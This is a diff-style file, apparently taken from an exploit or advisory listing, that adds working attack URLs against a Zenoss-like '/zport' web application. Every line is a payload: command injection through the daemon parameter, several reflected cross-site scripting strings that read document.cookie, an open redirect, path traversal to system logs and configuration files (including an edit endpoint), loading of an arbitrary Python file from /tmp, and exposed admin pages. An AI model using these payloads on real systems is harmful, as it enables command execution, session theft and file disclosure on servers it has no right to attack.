@@ -1,0 +1,15 @@
+http://www.example.com/zport/About/showDaemonXMLConfig?daemon=uname%20-a%26
+http://www.example.com/zport/dmd/Events/Users/@@eventClassStatus?tableName=eventinstances&sortedHeader=primarySortKey&sortedSence=&sortRule=cmp&sortedSence="><script>alert(document.cookie)</script><"
+http://www.example.com/zport/dmd/Events/Users/eventClassStatus?tableName=eventinstances&sortedHeader=primarySortKey&sortedSence=&sortRule=cmp&sortedSence="><script>alert(document.cookie)</script><"
+http://www.example.com/zport/dmd/Events/Status/Snmp/@@eventClassStatus?tableName=eventinstances&sortedHeader=primarySortKey&sortedSence="><script>alert(document.cookie)</script><"
+http://www.example.com/zport/dmd/ZenEventManager/listEventCommands?tableName=eventCommands&sortedHeader=primarySortKey&sortRule=cmp&sortedSence="><script>alert(document.cookie)</script><"
+http://www.example.com/zport/dmd/backupInfo?tableName=backupTable&sortedHeader=fileName&sortRule=cmp&sortedSence="><script>alert(document.cookie)</script>
+http://www.example.com/zport/acl_users/cookieAuthHelper/login?came_from=http%3a//example%2ecom/%3f
+http://www.example.com/zport/About/viewDaemonLog?daemon=../../../var/log/mysqld
+http://www.example.com/zport/About/viewDaemonConfig?daemon=../../../../etc/syslog
+http://www.example.com/zport/About/editDaemonConfig?daemon=../../../../etc/syslog
+http://www.example.com/zport/RenderServer/plugin?name=../../../../../../tmp/arbitrary-python-file
+http://www.example.com/zport/dmd/ZenEventManager
+http://www.example.com/manage
+
+
